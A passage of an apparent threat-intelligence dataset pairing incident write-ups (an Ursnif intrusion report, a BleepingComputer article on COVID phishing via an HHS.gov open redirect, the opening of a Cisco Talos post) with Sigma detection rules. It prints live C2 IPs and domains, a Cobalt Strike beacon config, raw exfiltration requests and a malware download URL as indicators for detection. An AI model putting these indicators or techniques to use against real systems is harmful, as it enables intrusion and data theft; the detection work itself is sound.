\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnCZHWnYFqYB/6gJdkc4MPDTtBJ20nkEAd3tsY4tPKs8MV4yIjJb5CtlrbKHjzP1oD/1AQsj6EKlEMFIKtakLx5+VybrMYE+dDdkDteHmVX0AeFyw001FyQVlt1B+OSNPRscKI5sh1L/ZdwnrMy6S6nNbQ5N5hls6k2kgNO5nQ7QIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\",\n    \"port\": \"443\",\n    \"hostname\": \"193.201.9.199\"\n  },\n  \"beacontype\": [\n    \"HTTPS\"\n  ],\n  \"kill_date\": null,\n  \"license_id\": \"1580103824\",\n  \"jitter\": \"0\",\n  \"sleeptime\": \"60000\",\n  \"http_get\": {\n    \"server\": {\n      \"output\": [\n        \"print\"\n      ]\n    },\n    \"client\": {\n      \"metadata\": [],\n      \"headers\": []\n    },\n    \"verb\": \"GET\",\n    \"uri\": \"/__utm.gif\"\n  },\n  \"cfg_caution\": \"false\",\n  \"host_header\": \"\",\n  \"crypto_scheme\": \"0\",\n  \"http_post\": {\n    \"client\": {\n      \"output\": [],\n      \"id\": [],\n      \"headers\": []\n    },\n    \"verb\": \"POST\",\n    \"uri\": \"/submit.php\"\n  }\n}\n```\n\nChecking the certificate used, reveals that it is a default SSL certificate for Cobalt Strike, `83cd09b0f73c909bfc14883163a649e1d207df22`.\n\n```image\nAlt: Cobalt Strike Certificate\nDescription: The image displays detailed information about a Cobalt Strike SSL certificate. It includes attributes such as the serial number, issue and expiration dates, common name, alternative names, organization name, SSL version, organization unit, street address, locality, state/province, and country. The certificate was issued on March 20, 2020, and expires on June 18, 2020. Additionally, it lists various IP addresses associated with the certificate and other related metadata.\nTranscription: |\n  ▼ 83cd09b0f73c909bfc14883163a649e1d207df22\n  Serial Number    1514727070\n  Issued           2020-03-20\n  Expires          2020-06-18\n  Common Name      Major Cobalt Strike (subject)\n                   Major Cobalt Strike (issuer)\n  Alternative Names\n  Organization Name cobaltstrike (subject)\n                   cobaltstrike (issuer)\n  SSL Version      3\n  Organization Unit AdvancedPenTesting (subject)\n                   AdvancedPenTesting (issuer)\n  Street Address\n  Locality         Somewhere (subject)\n                   Somewhere (issuer)\n  State/Province   Cyberspace (subject)\n                   Cyberspace (issuer)\n  Country          Earth (subject)\n                   Earth (issuer)\n  120.55.52.230\n  107.172.21.150\n  2.47.145.134\n  147.182.141.254\n  1.117.23.177\n  123.60.220.134\n  82.157.61.211\n  1.13.165.153\n  178.18.255.124\n  81.68.212.18\n  ...90 more (757 total)\n```\n\n### Atera & SplashTop\n\nEven though the threat actor installed these agents, we did not observe any activity with these tools.\n\n## Exfiltration\n\nSeveral HTTP Post events were observed to the identified domains denterdrigx[.]com, superliner[.]top and 5.42.199[.]83, masquerading as image uploads.\n\n```image\nAlt: HTTP Post Events\nDescription: This image displays a table of HTTP POST events, showing various attributes such as method, host, URI, referrer, version, and user agent. The user agent indicates an unusual configuration, mimicking Internet Explorer 8.0. The table contains multiple entries with details related to potential exfiltration activities associated with the Ursnif malware.\nTranscription: |\n  | method | host            | uri                                                                    | referrer | version | user_agent                                                      |\n  | ------ | --------------- | ---------------------------------------------------------------------- | -------- | ------- | --------------------------------------------------------------- |\n  | POST   | 5.42.199.83     | /images/Ck9eK1t7nG2aJEFfRkH3G/6Edg_2F0Wz/zejo8Et_2FWtBqwPAL/p_2FjJWus  |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | denterdrigx.com | /images/N9DgCzRluSy_2/FCm0_2B0/8kLCopNibkm_2B3DLQ3Pgn/7sc7cmax4/n_2I   |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | superliner.top  | /images/y_2FwnJBSxM7p/XliYjcT0stjS0j8g_2FS/eETNAGNiA30V_2F/rYJHD0NjM8  |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | superliner.top  | /images/QTPIU076Cf/kxh_2FqyrnKmaNobB/Wd1c0t8W1h2/7NMzHdJFTV/xq80XWt    |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | superliner.top  | /images/nTdMVrZTaLEsT7/6v_2Fps52Z1cysPt46PQ4/pQvLbE56AXTofdFr/1awUjWUs |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | denterdrigx.com | /images/5_2BHRW7kYh3_2F/0JFWeryjais/5W8gA/pYSkVgFJdO/p_2B              |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | superliner.top  | /images/YiuBf7xIzXt/7J0x_2Bg5AnA/0deMFo1gKYC0/0L0e1q1NpVTXDbU1h1       |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | superliner.top  | /images/etrSoTrBiPG4WT0kU8S/2Fv5CulAj6iUp/CYmKaAfo17jHq9k/6_2By70v     |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | superliner.top  | /images/NKN0u0L_2B1b9eNlg/dzchW504/NZ6KvpxclcuZ7Ti9u1/K52qVk458BTN     |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | superliner.top  | /images/NWNK0u0L_2B1b9eNlg/dzchW504/NZ6KvpxclcuZ7Ti9u1/K52qVk458BTN    |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n```\n\nThe user agent ‘Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64)’, an unusual browser configuration to masquerade as, which indicates use of Internet Explorer 8.0 (that was released ~2009).\n\nThe POST event included a MIME part indicating file upload activity\n\n```image\nAlt: MIME Part\nDescription: The image displays a MIME multipart media encapsulation format, which is utilized for sending files over HTTP. It includes details such as the type of content ('multipart/form-data'), the boundary used for separating parts of the data, and specifics about the encapsulated multipart part, which indicates a file upload. The content disposition shows the name and filename of the uploaded file ('775E.bin') along with data size (544 bytes). This technical information is relevant for understanding the file exfiltration process described in the context.\nTranscription: |\n  MIME Multipart Media Encapsulation, Type: multipart/form-data, Boundary: \"120883289042639862971\"\n  [Type: multipart/form-data]\n  First boundary: --120883289042639862971\\r\\n\n  Encapsulated multipart part:\n  Content-Disposition: form-data; name=\"upload_file\"; filename=\"775E.bin\"\\r\\n\\r\\n\n  Data (544 bytes)\n```\n\nThe example HTTP stream containing the content\n\n```image\nAlt: HTTP Stream\nDescription: The image displays a raw HTTP POST request, showing details related to a file upload activity. It includes headers such as 'Content-Type', 'User-Agent', 'Content-Length', and the actual content being sent in the request. The content disposition indicates the file being uploaded is named '775E.bin'. This technical information is relevant for analyzing exfiltration activities in cybersecurity.\nTranscription: |\n  POST /images/YiuB7f1xzJXt/170x_2Bg5An/a0dePMOf1gKYCO/\n  00Leq1NPvlYTKD8uInh1/4K3i8n_2BAroasG2/2nmvPNlVByFE7KL/xylY1RoxhI8UPrMw1w/K7VyU8izC/\n  70WPgttanotV9GsmJx/CjIaaKCS8S1Xd571/_2FcTxPv6UmYw0sQ3Ge6xc/XRHa6n_2Bh9pQ/5qrw8sQ_/\n  2BjJNG1C8D0suFRWqZJAoTa/TgZgZn9tS_/2Fy5m4aJejM_2BkN/4zw0medubdVk/FKjbQC4413d/VJeNInhAplok747/uai20.bmp\n  HTTP/1.1\n  Content-Type: multipart/form-data; boundary=120883289042639862971\n  User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64)\n  Host: superliner.top\n  Content-Length: 673\n  Connection: Keep-Alive\n  Cache-Control: no-cache\n  \n  --120883289042639862971\n  Content-Disposition: form-data; name=\"upload_file\"; filename=\"775E.bin\"\n  \n  ...Y...@...J51j...b...q...t...7.Q.z.K.x...X...u...*...YR:0.9b.Kr...#...vG...z...l...\n  ...y...B...l...\n  ...y...D...D...P...P...F.3...y...k.h.+.fH...<...a\\v.X.p>.../n.J./F......(....1...\n  ...*...N...l...J...3...6j9...\n  ...d...g...d...o...Z.e.fpd^......F...6...<...\n  ...&...c...U...n...e...v...(...\n  ...U.N\n  --120883289042639862971--\n```\n\nThe file that was uploaded 775E.bin was deleted by the injected ‘Explorer.exe’ process from the target endpoint in folder ‘\\Users\\<REDACTED>\\AppData\\Local\\Temp’\n\n```image\nAlt: File Deletion\nDescription: The image displays a snippet of text showing a file deletion log. It indicates that the process 'Explorer.EXE' located in 'C:\\Windows' was involved in deleting a file named '775E.bin' from a user's temporary files directory ('C:\\Users\\<REDACTED>\\AppData\\Local\\Temp'). The target file path is partially redacted, suggesting that it may contain sensitive information.\nTranscription: |\n  Image: C:\\Windows\\Explorer.EXE\n  TargetFilename: C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\775E.bin\n```\n\nThe exfiltration activity along with the beacon activity can be detected using the following network signatures: ET MALWARE Ursnif Variant CnC Data Exfil and ET MALWARE Ursnif Variant CnC Beacon. In this example, the mix of activity can be observed as:\n\n```image\nAlt: Network Signatures\nDescription: The image displays a list of network signatures related to the Ursnif malware variants, specifically focusing on Command and Control (CnC) data exfiltration and beaconing activities. The list includes repeated entries for 'ET MALWARE Ursnif Variant CnC Data Exfil' and 'ET MALWARE Ursnif Variant CnC Beacon', indicating the signatures used to detect these specific types of network activity associated with the malware.\nTranscription: |\n  ET MALWARE Ursnif Variant CnC Beacon\n  ET MALWARE Ursnif Variant CnC Data Exfil\n  ET MALWARE Ursnif Variant CnC Beacon\n  ET MALWARE Ursnif Variant CnC Beacon\n  ET MALWARE Ursnif Variant CnC Beacon\n  ET MALWARE Ursnif Variant CnC Beacon\n  ET MALWARE Ursnif Variant CnC Beacon\n  ET MALWARE Ursnif Variant CnC Data Exfil\n  ET MALWARE Ursnif Variant CnC Data Exfil\n  ET MALWARE Ursnif Variant CnC Beacon\n```\n\n## Impact\n\nThe threat actor was able to RDP to a backup server using the admin credentials they acquired. Using the logs in `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` we were able to determine the threat actor spent approximately 10 minutes on the backup server before disconnecting their RDP session. By doing this, they revealed the workstation name of the client: `WIN-RRRU9REOK18`.\n\n```\nLogName=Security\nEventCode=4624\nEventType=0\nComputerName=<REDACTED>\nSourceName=Microsoft Windows security auditing.\nType=Information\nRecordNumber=300297\nKeywords=Audit Success\nTaskCategory=Logon\nOpCode=Info\nMessage=An account was successfully logged on.\n\nLogon Information:\n\tLogon Type:\t\t3\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\nNetwork Information:\n\tWorkstation Name:\tWIN-RRRU9REOK18\n\tSource Network Address:\t<REDACTED>\n\tSource Port:\t\t0\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp\n\tAuthentication Package:\tNTLM\n\tTransited Services:\t-\n\tPackage Name (NTLM only):\tNTLM V2\n```\n\nDuring that time, the threat actor undertook a number of hands-on keyboard actions; this included reviewing backups in a backup console, checking on running tasks, and using notepad to paste in the following content.\n\nProcess execution:\n\n```\nC:\\Program Files\\[redacted]\\Console\\[redacted].exe\n\"C:\\Windows\\system32\\taskmgr.exe\" /4\n\"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\Users\\USER\\Desktop\\New Text Document.txt\n```\n\nSysmon Copy Paste Collection EID 24:\n\n```\nuser: DOMAIN\\USER ip: 127.0.0.1 hostname: WIN-RRRU9REOK18\n```\n\n```image\nAlt: Sysmon Copy Paste\nDescription: The image displays a Sysmon event log detailing an event related to process execution. It contains structured data including the event's timestamp, user information, process details, and host information. Relevant fields include 'ClientInfo' showing the user and IP address, hashed values for integrity checks, and the image path of the executed process (PowerShell). The log appears to be in JSON format, indicating the event's characteristics, such as process ID and associated session.\nTranscription: |\n  json\n  {\n    \"EventData\": {\n      \"Archived\": \"true\",\n      \"ClientInfo\": {\n        \"user\": \"ip: 127.0.0.1\",\n        \"hostname\": \"WIN-RRRU9REOK18\"\n      },\n      \"Hashes\": {\n        \"SHA1\": \"DA39A3EE5E6B48B0D3255BFE95601890AFB70709\",\n        \"MD5\": \"D41D8CD98F00B204E9800998ECF8427E\",\n        \"SHA256\": \"E3B0C44298FC1C149AFBF4C8996FB9247AE41E4649B934CA495991B7852B855\",\n        \"IMPHASH\": \"00000000000000000000000000000000\"\n      },\n      \"Image\": \"C:\\\\Windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n      \"ProcessGuid\": \"BB66CC4A-7A32-630E-BB6F-000000000300\",\n      \"ProcessId\": 11780,\n      \"RuleName\": \"\",\n      \"Session\": 4,\n      \"User\": \"\",\n      \"UtcTime\": \"00:12:06.271\"\n    }\n  }\n```\n\n# Indicators\n\n### Atomic\n\n```\nRDP Client Name:\nWIN-RRRU9REOK18\n\nUrsnif Domains:\ndenterdrigx.com\nsuperliner.top\ninternetlines.in\nsuperstarts.top\nsuperlinez.top\ninternetlined.com\n\nUrsnif IPs:\n62.173.149.7\n31.41.44.97\n5.42.199.83\n31.41.44.27\t\n208.91.197.91\n187.190.48.135\n210.92.250.133\n189.143.170.233\n201.103.222.246\n151.251.24.5\n190.147.189.122\n115.88.24.202\n211.40.39.251\n187.195.146.2\n186.182.55.44\n222.232.238.243\n211.119.84.111\n51.211.212.188\n203.91.116.53\n115.88.24.203\n190.117.75.91\n181.197.121.228\n190.167.61.79\n109.102.255.230\n211.119.84.112\n190.107.133.19\n185.95.186.58\n175.120.254.9\n46.194.108.30\n190.225.159.63\n190.140.74.43\n187.156.56.52\n195.158.3.162\n138.36.3.134\n109.98.58.98\n24.232.210.245\n222.236.49.123\n175.126.109.15\n124.109.61.160\n95.107.163.44\n93.152.141.65\n5.204.145.65\n116.121.62.237\n31.166.129.162\n222.236.49.124\n211.171.233.129\n211.171.233.126\n211.53.230.67\n196.200.111.5\n190.219.54.242\n190.167.100.154\n110.14.121.125\n58.235.189.192\n37.34.248.24\n110.14.121.123\n179.53.93.16\n175.119.10.231\n211.59.14.90\n188.48.64.249\n187.232.150.225\n186.7.85.71\n148.255.20.4\n91.139.196.113\n41.41.255.235\n31.167.236.174\n189.165.2.131\n1.248.122.240\n193.106.191.186\n\nCobalt Strike:\n193.201.9.199\n```\n\n### Computed\n\n```\n3488164.iso\nf7d85c971e9604cc6d2a2ffcac1ee4a3\n67175143196c17f10776bdf5fbf832e50a646824\ne999890ce5eb5b456563650145308ae837d940e38aec50d2f02670671d472b99\n\n6570872.lnk\nc6b605a120e0d3f3cbd146bdbc358834\n328afa8338d60202d55191912eea6151f80956d3\n16323b3e56a0cbbba742b8d0af8519f53a78c13f9b3473352fcce2d28660cb37\n\nadcomp.bat\neb2335e887875619b24b9c48396d4d48\nb658ab9ac2453cde5ca82be667040ac94bfcbe2e\n4aa4ee8efcf68441808d0055c26a24e5b8f32de89c6a7a0d9b742cce588213ed\n\nalsoOne.bat\nc03f5e2bc4f2307f6ee68675d2026c82\n4ce65da98f0fd0fc4372b97b3e6f8fbeec32deb3\n6a9b7c289d7338760dd38d42a9e61d155ae906c14e80a1fed2ec62a4327a4f71\n\ncanWell.js\n6bb867e53c46aa55a3ae92e425c6df91\n6d4f1a9658baccd2e406454b2ad40ca2353916ab\n5b51bd2518ad4b9353898ed329f1b2b60f72142f90cd7e37ee42579ee1b645be\n\nfirefox.exe\n6a4356bd2b70f7bd4a3a1f0e0bfec9a4\n485a179756ff9586587f8728e173e7df83b1ffc3\n6c5338d84c208b37a4ec5e13baf6e1906bd9669e18006530bf541e1d466ba819\n\nitsIt.db\n60375d64a9a496e220b6eb1b63e899b3\nd1b2dd93026b83672118940df78a41e2ee02be80\n8e570e32acb99abfd0daf62cff13a09eb694ebfa633a365d224aefc6449f97de\n\nor.jpg\n60ca7723edd4f3a0561ea9d3a42f82b4\n87b699122dacf3235303a48c74fa2b7a75397c6b\nbbcceb987c01024d596c28712e429571f5758f67ba12ccfcae197aadb8ab8051\n\ncook32.rar\n3db94cf953886aeb630f1ae616a2ec25\n743128253f1df9e0b8ee296cfec17e5fc614f98d\n1cdbf7c8a45b753bb5c2ea1c9fb2e53377d07a3c84eb29a1b15cdc140837f654\n\ncook64.rar\nd99cc31f3415a1337e57b8289ac5011e\nf67ce90f66f6721c3eea30581334457d6da23aac\nb94810947c33a0a0dcd79743a8db049b8e45e73ca25c9bfbf4bfed364715791b\n\nstilak32.rar\na1f634f177f73f112b5356b8ee04ad19\n7c82b558a691834caf978621f288af0449400e03\nc77ea4ad228ecad750fb7d4404adc06d7a28dbb6a5e0cf1448c694d692598f4f\n\nstilak64.rar\n8ea6ad3b1acb9e7b2e64d08411af3c9a\n7c04c4567b77981d0d97d8c2eb4ebd1a24053f48\ndfdfd0a339fe03549b2475811b106866d035954e9bc002f20b0f69e0f986838f\n\nvnc32.rar\n0c5862717f00f28473c39b9cba2953f4\n25832c23319fcfe92cde3d443cc731ac056a964a\n7ebd70819a79be55d4c92c66e74e90e3309ec977934920aee22cd8d922808c9d\n\nvnc64.rar\nce77f575cc4406b76c68475cb3693e14\n80fdc4712ae450cfa41a37a24ce0129eff469fb7\nf02dc60872f5a9c2fcc9beb05294b57ad8a4a9cef0161ebe008\n```\n\n## Detections\n\n### Network\n\nPotential Impacket wmiexec.py activity\n\n```\nET MALWARE Ursnif Variant CnC Beacon\nET MALWARE Ursnif Variant CnC Beacon - URI Struct M2 (_2F)\nET INFO HTTP Request to a *.top domain\nET DNS Query to a *.top domain - Likely Hostile\nET MALWARE Ursnif Variant CnC Data Exfil\nET INFO Dotted Quad Host RAR Request\nET MALWARE Meterpreter or Other Reverse Shell SSL Cert\nET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike\nET POLICY RDP connection confirm\nET POLICY MS Remote Desktop Administrator Login Request\nET MALWARE Ursnif Variant CnC Beacon 3\nET MALWARE Ursnif Payload Request (cook32.rar)\nET MALWARE Ursnif Payload Request (cook64.rar)\nET INFO Splashtop Domain (splashtop .com) in TLS SNI\nET INFO Splashtop Domain in DNS Lookup (splashtop .com)\n```\n\n### Sigma\n\n- Driver Query Lookup\n- MSHTA Execution\n- NSLookup Local\n- System Time Lookup\n- Ursnif Loader\n- LOLBin Not From C Drive\n- Suspicious LOLBin Non-C Drive\n- WMIC ComputerSystem Recon\n- Suspicious Systeminfo\n- Cobalt Strike Pipe Created\n- Suspicious LSASS Access\n- WMICExec Default Filename\n- Impacket Lateralization\n- Splashtop Software\n- Splashtop Network\n- Get-ADComputer\n- Proxy UA Malware\n\n### Yara\n\n- ISFB Gozi Yara\n- DFIR Report Yara\n\n## MITRE\n\n```\nMshta - T1218.005\nVisual Basic - T1059.005\nCompile After Delivery - T1027.004\nBITS Jobs - T1197\nCredentials from Password Stores - T1555\nLSASS Memory - T1003.001\nSystem Information Discovery - T1082\nProcess Discovery - T1057\nDomain Trust Discovery - T1482\nMark-of-the-Web Bypass - T1553.005\nMalicious File - T1204.002\nSystem Time Discovery - T1124\nSystem Owner/User Discovery - T1033\nRemote System Discovery - T1018\nRemote Desktop Protocol - T1021.001\nWindows Management Instrumentation - T1047\nDomain Account - T1087.002\nProcess Injection - T1055\nAsynchronous Procedure Call - T1055.004\nRegistry Run Keys / Startup Folder - T1547.001\nRemote Access Software - T1219\nWeb Protocols - T1071.001\nLateral Tool Transfer - T1570\nExfiltration Over C2 Channel - T1041\n```",
    "sigma_rule": {
      "title": "DriverQuery.EXE Execution",
      "id": "a20def93-0709-4eae-9bd2-31206e21e6b2",
      "related": [
        {
          "id": "9fc3072c-dc8f-4bf7-b231-18950000fadd",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detect usage of the \"driverquery\" utility. Which can be used to perform reconnaissance on installed drivers",
      "references": [
        "https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/",
        "https://www.vmray.com/cyber-security-blog/analyzing-ursnif-behavior-malware-sandbox/",
        "https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-19",
      "modified": "2023-09-29",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "driverquery.exe"
          },
          {
            "OriginalFileName": "drvqry.exe"
          }
        ],
        "filter_main_other": [
          {
            "ParentImage|endswith": [
              "\\cscript.exe",
              "\\mshta.exe",
              "\\regsvr32.exe",
              "\\rundll32.exe",
              "\\wscript.exe"
            ]
          },
          {
            "ParentImage|contains": [
              "\\AppData\\Local\\",
              "\\Users\\Public\\",
              "\\Windows\\Temp\\"
            ]
          }
        ],
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate use by third party tools in order to investigate installed drivers"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_driverquery_usage.yml",
    "id": "156"
  },
  {
    "url": "https://www.bleepingcomputer.com/news/security/hhsgov-open-redirect-used-by-coronavirus-phishing-to-spread-malware/",
    "markdown": "# HHS.gov Open Redirect Used by Coronavirus Phishing to Spread Malware\n\nMarch 23, 2020\n\nAn HHS.gov open redirect is currently being used by attackers to push malware payloads onto unsuspecting victims' systems with the help of coronavirus-themed phishing emails.\n\nOpen redirects are web addresses that automatically redirect users between a source website and a target site, and are regularly used by malicious actors to send their targets to phishing landing pages or to deliver malware payloads under the guise of legitimate services.\n\nHHS.gov is the website of the U.S. Department of Health & Human Services which makes this specific open redirect the perfect tool to lure in potential victims.\n\nThe open redirect (*https://dcis.hhs.gov/cas/login?service=MALICIOUSURL&gateway=true*) is present on the subdomain of HHS's Departmental Contracts Information System, and it was discovered and shared on Twitter by infosec analyst @SecSome.\n\n```image\nAlt: Phishing email sample\nDescription: The image is a screenshot of a phishing email that masquerades as a communication from a health care organization. It contains information about Covid-19, including what the virus is, its symptoms, and statistics on how many people have been affected. The email urges recipients to inspect emails closely before clicking links or opening attachments, hinting at its malicious intent. The layout includes headers indicating the sender and subject, further mimicking a legitimate correspondence.\nTranscription: |\n  From: Health Care Organization <contact@letsachievehealth.com>\n  Sent: Sunday, March 22, 2020 7:41:36 PM\n  To: [REDACTED]\n  Subject: Coronavirus symptoms: what are they and should I see a doctor?\n  \n  Inspect emails closely before clicking links or opening attachments. Forward suspicious messages to [REDACTED].\n  \n  What is Covid-19?\n  It is caused by a member of the coronavirus family that has never been encountered before. Like other coronaviruses, it has transferred to humans from animals. The World Health Organisation (WHO) has declared it a pandemic.\n  \n  What are the symptoms this coronavirus causes?\n  According to the WHO, the most common symptoms of Covid-19 are fever, tiredness and a dry cough. Some patients may also have a runny nose, sore throat, nasal congestion and aches and pains or diarrhoea. About 80% of people who get Covid-19 experience a mild case - about as serious as a regular cold and recover without needing any special treatment. About one in six people, the WHO says, become seriously ill. The elderly and people with underlying medical problems like high blood pressure, heart problems or diabetes, or chronic respiratory conditions, are at a greater risk of serious illness from Covid-19.\n  \n  How many people have been affected?\n  There have been over 13,000 deaths globally. Just over 3,000 of those deaths have occurred in mainland China, where the coronavirus was first recorded in the city of Wuhan. Italy has been hardest hit, though, with over 4,800 fatalities. Many of those who have died had underlying health conditions, which the coronavirus complicated. More than 92,000 people are recorded as having recovered from the coronavirus.\n  \n  Find and research your medical symptoms\n```\n\n**Phishing email sample** (*SecSome*)\n\nThe attackers use it to link to a malicious attachment containing a *coronavirus.doc.lnk* file which will unpack an obfuscated VBS script that will download and execute a Raccoon information stealer malware payload from *http://185.62.188[.]204/hunt/post/corona.exe* (VirusTotal analysis) after saving it to *%Temp%\\HhKFW.exe*.\n\nRaccoon (aka Legion, Mohazo, and Racealer) is an information-stealing malware initially spotted almost a year ago on cybercriminal forums and capable of stealing data such as email credentials, credit card info, cryptocurrency wallets, browser data, and system information.\n\nA report from CyberArk says that Raccoon is capable of digging its way into about 60 different applications, from browsers, cryptocurrency wallets, email and FTP clients to steal and deliver sensitive information to its operators.\n\nAfter executing the infostealer, the script also makes use of a decoy that shows an error message to make the victim think there is something wrong with the malicious document.\n\n```image\nAlt: Decoy error message\nDescription: The image depicts a pop-up error message from Microsoft Word, displaying a warning icon and the text \"Error: File is broken.\" This message is likely intended as a decoy to trick users into believing there is an issue with a malicious file they are attempting to open. The context suggests that this error message is part of a phishing campaign utilizing coronavirus-themed emails to distribute malware.\nTranscription: |\n  Microsoft Word\n  Error: File is broken\n  [OK]\n```\n\n**Decoy error message**\n\nThe server used to previously deliver the malicious payload has since been taken down to probably be replaced with a new one very soon.\n\nBleepingComputer has also been told that the U.S. Department of Health and Human Services (HHS) has been notified of the redirect and it will be hopefully taken offline soon.\n\nWhile the current phishing campaign abusing HHS.gov open redirects only drops an infostealer as the final malware payload, it can be used to inflict much more damage if the threat actors ever decide to switch payloads.\n\nAs an extra tidbit of info, operators behind Netwalker Ransomware have used the same obfuscated VBS script template (in deobfuscated form here) to deliver their payloads in a campaign spotted by MalwareHunterTeam last week.\n\nThat series of attacks also used Coronavirus (COVID-19) phishing emails with attachments named 'CORONAVIRUS_COVID-19.vbs' containing an embedded Netwalker Ransomware executable as well as obfuscated code designed to extract and launch it on the compromised devices.\n\n## Coronavirus themed phishing and malware\n\nTo defend against similar attacks, you should always be suspicious of coronavirus related attachments, especially when received from unknown senders as there's currently a huge influx of malicious attacks using the current COVID-19 pandemic to steal personal information and deliver malware via phishing campaigns.\n\nAdditionally, always make sure that you have configured Windows Explorer to show file extensions for all file types as a lot of phishing attacks deliver malicious executables that pretend to be harmless docs. To do that uncheck the 'Hide extensions for known file types' in the File Explorer Options as shown in this tutorial.\n\nLast month, the World Health Organization (WHO), the U.S. Federal Trade Commission (FTC), and the US Cybersecurity and Infrastructure Security Agency (CISA) have all warned about ongoing Coronavirus-themed phishing and cyberscams (1, 2, 3).",
    "sigma_rule": {
      "title": "Findstr Launching .lnk File",
      "id": "33339be3-148b-4e16-af56-ad16ec6c7e7b",
      "status": "test",
      "description": "Detects usage of findstr to identify and execute a lnk file as seen within the HHS redirect attack",
      "references": [
        "https://www.bleepingcomputer.com/news/security/hhsgov-open-redirect-used-by-coronavirus-phishing-to-spread-malware/"
      ],
      "author": "Trent Liffick",
      "date": "2020-05-01",
      "modified": "2024-01-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036",
        "attack.t1202",
        "attack.t1027.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\find.exe",
              "\\findstr.exe"
            ]
          },
          {
            "OriginalFileName": [
              "FIND.EXE",
              "FINDSTR.EXE"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            ".lnk",
            ".lnk\"",
            ".lnk'"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_findstr_lnk.yml",
    "id": "167"
  },
  {
    "url": "https://blog.talosintelligence.com/recent-cyber-attack",
    "markdown": "# Cisco Talos shares insights related to recent cyber attack on Cisco\n\n_By Nick Biasini_\n**Wednesday, August 10, 2022 15:30**\n**Category:** Headlines\n\n---\n\n### THIS POST IS ALSO AVAILABLE IN:\n日本語 (Japanese)\n\n---\n\n## Update History\n\n| Date             | Description of Updates                                                                 |\n|------------------|----------------------------------------------------------------------------------------|\n| Aug. 10th 2022   | Adding clarifying details on activity involving active directory.                      |\n| Aug. 10th 2022   | Update made to the Cisco Response and Recommendations section related to MFA.          |\n\n---\n\n## Executive summary\n\n- On May 24, 2022, Cisco became aware of a potential compromise. Since that point, Cisco Security Incident Response (CSIRT) and Cisco Talos have been working to remediate.\n- During the investigation, it was determined that a Cisco employee’s credentials were compromised after an attacker gained control of a personal Google account where credentials saved in the victim’s browser were being synchronized.\n- The attacker conducted a series of sophisticated voice phishing attacks under the guise of various trusted organizations attempting to convince the victim to accept multi-factor authentication (MFA) push notifications initiated by the attacker. The attacker ultimately succeeded in achieving an MFA push acceptance, granting them access to VPN in the context of the targeted user.\n- CSIRT and Talos are responding to the event and we have not identified any evidence suggesting that the attacker gained access to critical internal systems, such as those related to product development, code signing, etc.\n- After obtaining initial access, the threat actor conducted a variety of activities to maintain access, minimize forensic artifacts, and increase their level of access to systems within the environment.\n- The threat actor was successfully removed from the environment and displayed persistence, repeatedly attempting to regain access in the weeks following the attack; however, these attempts were unsuccessful.\n- We assess with moderate to high confidence that this attack was conducted by an adversary that has been previously identified as an initial access broker (IAB) with ties to the UNC2447 cybercrime gang, Lapsus$ threat actor group, and Yanluowang ransomware operators.\n- For further information see the Cisco Response page here.\n\n---\n\n## Initial vector\n\nInitial access to the Cisco VPN was achieved via the successful compromise of a Cisco employee’s personal Google account. The user had enabled password syncing via Google Chrome and had stored their Cisco credentials in their browser, enabling that information to synchronize to their Google account. After obtaining the user’s credentials, the attacker attempted to bypass multifactor authentication (MFA) using a variety of techniques, including voice phishing (aka \"vishing\") and MFA fatigue.\n\nOnce the attacker had obtained initial access, they enrolled a series of new devices for MFA and authenticated successfully to the Cisco VPN. The attacker then escalated to administrative privileges, allowing them to login to multiple systems, which alerted our Cisco Security Incident Response Team (CSIRT), who 